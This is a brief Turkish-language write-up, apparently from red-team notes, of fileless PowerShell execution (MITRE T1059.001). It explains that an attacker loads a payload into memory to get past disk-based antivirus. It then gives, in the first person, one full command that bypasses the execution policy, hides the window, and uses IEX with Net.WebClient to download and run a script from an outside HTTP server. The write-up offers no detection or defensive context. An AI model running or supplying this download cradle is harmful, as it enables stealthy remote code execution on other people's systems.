# Dosyasız PowerShell Çalıştırma (Execution - T1059.001)

Diske dayalı antivirüs tespitlerini atlatmak için saldırgan, PowerShell kullanarak zararlı bir yükü (payload) doğrudan belleğe indirip çalıştırır.

## Uygulama (PowerShell)
Çalıştırma ilkelerini (ExecutionPolicy) atlatan, pencereyi gizleyen ve `Net.WebClient` kullanarak harici bir sunucudan payload indiren bir PowerShell komutu çalıştırdım.

```cmd
# Payload'u doğrudan bellekte çalıştır
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('[http://192.168.1.100:8000/payload.ps1](http://192.168.1.100:8000/payload.ps1)')"
```